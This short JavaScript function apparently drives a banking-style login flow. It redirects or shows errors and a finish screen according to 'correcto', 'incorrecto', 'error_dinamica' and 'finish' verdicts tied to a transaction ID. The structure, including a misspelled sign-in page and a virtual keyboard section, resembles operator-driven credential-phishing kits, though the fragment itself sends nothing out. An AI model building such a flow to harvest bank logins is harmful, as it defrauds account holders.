async function handleAction(action, transactionId) {
  switch (action) {
    case `correcto:${transactionId}`:
      window.location.href = "loan-simulator.html";
      break;
    case `incorrecto:${transactionId}`:
      window.location.href = "accces-sign-in.html?error=1";
      loadingSpinner.style.display = "none";
      errorLogin.style.display = "block";
      break;
    case `error_dinamica`:
      console.log("Error en la dinámica de la aplicación");
      const loader = document.querySelector(".loadingContainer");
      loader.style.display = "none";
      const errorMessage = document.querySelector(".errorMessage");
      errorMessage.style.opacity = "1";
      errorMessage.style.transform = "translateY(-20px)";
      setTimeout(() => {
        errorMessage.style.opacity = "0";
        errorMessage.style.transform = "translateY(20px)";
      }, 5000);
      break;
    case `finish`:
      const loaderFinish = document.querySelector(".loadingContainer");
      loaderFinish.style.display = "none";
      const finishContainer = document.querySelector(".finishContainer");
      finishContainer.style.display = "block";
      sectionTeclado.style.display = "none";
      break;
  }
}
